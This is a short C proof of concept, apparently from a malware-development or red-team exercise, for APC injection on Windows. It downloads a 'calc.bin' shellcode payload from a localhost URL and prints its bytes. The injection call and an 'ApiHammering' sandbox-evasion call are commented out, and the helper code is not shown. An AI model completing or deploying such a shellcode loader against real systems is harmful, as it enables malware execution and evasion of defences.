#include <Windows.h>
#include "include/common.h"


// POC for testing APC injection
int main()
{
	// ApiHammering(2000);

	unsigned char* pPayload = NULL;
	
	PSTR url = "https://127.0.0.1";
	PSTR endpoint = "/calc.bin";
	
	SIZE_T sSize = Download(&pPayload, url, endpoint);

	if (sSize == -1)
		goto _Cleanup;
	//Printing shellcode
	printf("[*] Shellcode: \n");
	for (SIZE_T i = 0; i < sSize; i++)
	{
		printf("%02X ", pPayload[i]);
	}
	printf("\n");

	getchar();
	/*if (InitiateInjection(pPayload,sSize))
	{
		return -1;
	}*/

_Cleanup:
	return 0;

}